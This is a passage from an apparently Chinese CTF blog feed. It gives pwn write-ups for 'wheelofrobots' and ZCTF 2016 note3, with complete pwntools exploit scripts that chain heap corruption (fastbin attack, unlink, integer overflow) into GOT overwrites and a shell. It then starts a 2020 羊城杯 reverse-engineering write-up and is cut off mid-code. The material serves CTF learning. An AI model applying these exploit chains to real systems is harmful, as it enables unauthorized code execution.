class="number">0x6030E8</span></span><br><span class="line">fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">    fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>, fakechunk)</span><br><span class="line"><span class="comment"># trigger unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子 1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></li><li><p>由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 <code>exit()</code> patch 为一个 <code>ret</code> 地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。<strong>其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt 地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。</strong></p><blockquote><p>将 exit() got 表修改为 ret ，就通过多次调用总会输出被我们修改指针的轮子</p><p>hijack 某个函数 got 为 puts ，比如 free 那么实际上不是释放了是输出指针指向的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make exit just as return</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br></pre></td></tr></table></figure></li><li><p>在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc 中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动 shell。</p></li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./wheelofrobots&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./wheelofrobots&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span>(<span class="params">inuse</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">where, what</span>):</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;step 1 - fastbin attack&quot;</span></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># fastbin 指针指向：2 bender-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># 2 bender</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span></span><br><span class="line">    overflow_benderinuse(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    <span class="comment"># 覆写 fd 2 0x603138, point to 2 bender&#x27;s size,后面伪造堆fd就是destructor_size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    <span class="comment"># off-by-one 覆写 idx2 inuse 为 1</span></span><br><span class="line">    <span class="comment"># 让我们再一次申请 2 bender</span></span><br><span class="line">    overflow_benderinuse(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment"># add 2 bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    <span class="comment"># 将原来 2 bender 空间申请出来</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 释放无用堆</span></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    <span class="comment"># only save tinny(0x603138)</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 2 - unlink&#x27;</span></span><br><span class="line">    <span class="comment"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># alloc 3 devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 3 - hijack chunk1 ptr&#x27;</span></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 4 - hijack exit.got&#x27;</span></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(elf.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;step 5&#x27;</span></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(elf.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="ZCTF-2016-note3"><a href="#ZCTF-2016-note3" class="headerlink" title="ZCTF 2016 note3"></a>ZCTF 2016 note3</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>基本堆管理，有增删改功能。</p><p>堆数量上限为 8 个，大小在 0~1024 之间自定义。堆指针指针和 size 分别用一个列表存放，结合后面推测出，qword_6020C0[0] 为一个缓冲区，存储刚刚操作的完的 chunk_ptr 。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>delete 和 edit 读取序号时有点特殊，将输入值经过加密后的结果直接当做是下标，<strong>没有再进一步检查下标是否非法的</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = v0 - <span class="number">7</span> * (((<span class="keyword">signed</span> __int64)((<span class="keyword">unsigned</span> __int128)(<span class="number">5270498306774157605LL</span> * (<span class="keyword">signed</span> __int128)v0) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) - (v0 &gt;&gt; <span class="number">63</span>));</span><br></pre></td></tr></table></figure><p>这里存在一个整型溢出，当输入值为 0x8000000000000000 ，结果为 -1 ，这样就将修改缓冲区的堆块，修改程度为 chunk7 地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.bss:</span><br><span class="line">current_ptr &lt;&#x3D;&#x3D; edit ptr</span><br><span class="line">note0_ptr</span><br><span class="line">note1_ptr</span><br><span class="line">note2_ptr</span><br><span class="line">note3_ptr</span><br><span class="line">note4_ptr</span><br><span class="line">note5_ptr</span><br><span class="line">note6_ptr</span><br><span class="line">note7_ptr   &lt;&#x3D;&#x3D; size</span><br><span class="line">note0_size</span><br><span class="line">note1_size</span><br><span class="line">note2_size</span><br><span class="line">note3_size</span><br><span class="line">note4_size</span><br><span class="line">note5_size</span><br><span class="line">note6_size</span><br><span class="line">note7_size</span><br></pre></td></tr></table></figure><p>由于输入长度有限，所以将原值转换为负数：<code>0x8000000000000000 - 0x10000000000000000</code> 。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>利用整型漏洞，形成一个堆溢出。修改 next_chunk 的 header 信息，构造 unlink 条件。</li><li>unlink 后控制 chunk_ptr 指针，实现任意地址读写。由于程序输出功能，将 free 改为 puts 用来泄露地址，然后在将 free 改为 system 。</li></ol><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;info&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./note3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25763</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1024)\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;note:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;note:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;skyedidi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020d8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skyedidi&#x27;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0x6020c0</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:<span class="number">7</span>])</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - <span class="number">0x06f690</span><span class="comment">#libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">system = libc_base + <span class="number">0x045390</span><span class="comment">#libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">binsh = libc_base + <span class="number">0x18cd57</span><span class="comment">#next(libc.search(&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skyedidi&#x27;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020羊城杯Writeup</title>
      <link href="archives/85e155ec/"/>
      <url>archives/85e155ec/</url>
      
        <content type="html"><![CDATA[<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>下载附件是一个 pyinstaller 打包的 exe 文件。</p><h4 id="反编译-exe"><a href="#反编译-exe" class="headerlink" title="反编译 exe"></a>反编译 exe</h4><p>使用 <code>pyinstxtractor.py</code> 反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py login.exe</span><br></pre></td></tr></table></figure><blockquote><p>或者用 <code>Pyinstaller</code> 中的 \utils\cliutils\archive_viewer.py ，具体方法百度，略有不同</p></blockquote><p>找到目录中同名无后缀文件，修改后缀为 <code>.pyc</code> ，接着再找到 <code>struct</code> 一并复制出来。用 winhex 将 login.pyc 文件还原回来，pyinstaller 会去除这部分信息（python 版本、时间戳）。将 struct 前 8 字节添加到 login.pyc 开头，struct 文件头信息与 login.pyc 编译前一致，直接复制懒得去找对应 python 版本的文件头。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200910223542.png"></p><p>在线网站反编译 pyc 文件得到源码。</p><h3 id="逆加密算法"><a href="#逆加密算法" class="headerlink" title="逆加密算法"></a>逆加密算法</h3><p>15 元 1 次方的方程，用 z3 库解决时，设置变量为 Int 型需要注释有 <code>(a8 &lt;&lt; 7)</code> 这一条方程，否则因为变量类型问题无法运算。这时计算结果明显错误，需要添加约束，约束全部 a 都是 &gt;= 0 的。这是能计算出正确结果，将得出值用被注释方程验证，方程成立，结果为真。</p><p>然后就是一个迭代的异或解密，前一轮解密结果参与下一轮解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 